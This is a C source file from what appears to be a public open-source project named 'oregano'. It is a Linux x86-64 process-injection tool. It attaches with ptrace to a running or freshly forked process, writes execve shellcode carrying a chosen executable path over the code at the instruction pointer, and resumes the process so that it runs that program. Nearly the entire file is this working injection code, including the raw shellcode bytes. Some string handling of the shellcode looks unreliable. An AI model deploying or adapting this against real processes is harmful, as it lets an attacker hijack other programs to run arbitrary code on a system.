// oregano.c
// https://github.com/R-Rothrock/oregano

/*
 * MIT License
 *
 * Copyright (c) 2023 Roan Rothrock
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#define __OUTPUT__

#ifdef __OUTPUT__
#  include<stdio.h>
#  define INFO "\033[34m[+]\033[0m"
#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [.BIN/EXECUTABLE]\n", X); exit(1);
#endif

#define __GNU_SOURCE

#include<stdlib.h>
#include<string.h>
#include<sys/ptrace.h> /* ptrace() */
#include<sys/reg.h> /* EIP, RIP */
#include<sys/types.h> /* pid_t */
#include<sys/wait.h> /* waitpid() */
#include<unistd.h>

// X64
#if defined(__x86_64)
#  define OFFSET -1
#  define IP_REG RIP
#  define PTR_T u_int64_t

static u_int8_t base_shellcode[] = {
  0x48, 0x31, 0xc0,                         // xor rax, rax
  0x48, 0x31, 0xff,                         // xor rdi, rdi
  0x48, 0x31, 0xf6,                         // xor rsi, rsi
  0x48, 0x31, 0xd2,                         // xor rdx, rdx
  0x48, 0x8d, 0x3d, 0x25, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
  0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
  0xb0, 0x3b,                               // mov al, 59 ; execve()
  0x0f, 0x05,                               // syscall
  0x48, 0x31, 0xc0,                         // xor rax,rax
  0xb0, 0x3c,                               // mov al, 60 ; exit()
  0x48, 0x31, 0xff,                         // xor rdi,rdi
  0x0f, 0x05                                // syscall
};

//#elif defined(__i836) // amd32
//#  define OFFSET -1
//#  define IP_REG EIP
//#  define PTR_T u_int32_t

//#elif defined(__aarch64__) // arm64
//#  define OFFSET 1
//#  define IP_REG RIP
//#  define PTR_T u_int64_t

//#elif defined(__arm__) // arm32
//#  define OFFSET 1
//#  define IP_REG EIP
//#  define PTR_T u_int32_t

#else
#  error unsupported architecture
#endif

u_int8_t child(char *pathname)
{
  //printf("Child is executing...");
  char *child_argv[] = {pathname, 0};
  char *child_envp[] = {0};
  int ret = execve(child_argv[0], child_argv, child_envp);
  exit(ret);
}

void attach(pid_t pid)
{
  int _;
  ptrace(PTRACE_ATTACH, pid);
  waitpid(pid, &_, 0);
  ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEEXIT);
}

PTR_T get_ip_reg(pid_t pid)
{
  long ret = ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * IP_REG);
  return (PTR_T) (ret + OFFSET);
}

int main(int argc, char *argv[])
{

  pid_t pid;
  char *pathname;

  if(argc == 3)
  {

    // handling argv[1]

    char *str;
    long nr = strtol(argv[1], &str, 10);

    if(strlen(str) == 0)
    {
      // argv[1] is PID
      pid = (pid_t)nr;
    } else
    {
      // argv[1] is pathname
      // fork() and get PID
      pid = fork();

      if(pid == 0)
      {
        child(argv[1]);
      }
    }

    // handling argv[2]
    pathname = argv[2];

  } else
  {
    HELP(argv[0]);
  }

  #ifdef __OUTPUT__
    printf("%s Child PID: %i\n", INFO, pid);
  #endif

  attach(pid);

  // appending `pathname` to shellcode

  size_t shellcode_size = strlen(base_shellcode) + strlen(pathname);

  #ifdef __OUTPUT__
  printf("%s Shellcode size: %i\n", INFO, shellcode_size);
  #endif

  u_int8_t shellcode[shellcode_size];
  strcpy(shellcode, base_shellcode);
  strcat(shellcode, pathname);

  PTR_T ip = get_ip_reg(pid);

  for(int i = 0; i < sizeof(shellcode); i++, ip++)
  {
    #ifdef __OUTPUT__
    printf("%s 0x%04x\t%c\t> %p\n", INFO, shellcode[i], shellcode[i], ip);
    #endif

    ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
  }

  ptrace(PTRACE_CONT, pid, 0, 0);

  #ifdef __OUTPUT__

  int status;
  waitpid(pid, &status, 0);

  printf("%s Child status from waitpid: %i\n", INFO, status);
  while(1)
  {
    if(WIFEXITED(status))
    {
      printf("Child exit status: %i\n", WEXITSTATUS(status));
      exit(0);
    }
  }
  #endif

  return 0;

}
